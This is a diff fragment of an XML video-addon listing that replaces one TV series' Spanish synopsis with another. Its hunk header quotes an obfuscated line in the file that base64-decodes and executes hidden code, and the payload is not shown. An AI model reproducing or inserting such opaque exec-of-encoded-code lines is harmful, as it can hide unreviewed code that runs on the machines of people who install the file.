@@ -92,7 +92,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
-<info>Serie de TV (2019-). 6 episodios. La presidenta de la Confederación Suiza, Kathy Kunz, está en el apogeo de su poder y se dispone a intercambiar bombas ilegales por rehenes retenidos en Yemen. La situación amenaza con agravarse cuando Tina, una limpiadora del Palacio Federal, decide infiltrarse en los pasillos del poder para salvar a su familia.</info>
+<info>Serie de TV (2018). 5 episodios. A principios de los 80, una prostituta y el líder de una asociación juvenil son asesinados en un pequeño pueblo polaco. Dos periodistas no se fían de la investigación policial y deciden indagar por su cuenta.</info>
 <thumbnail>https://i.imgur.com/5L2hVrQ.jpg</thumbnail>
 <fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
 </item>
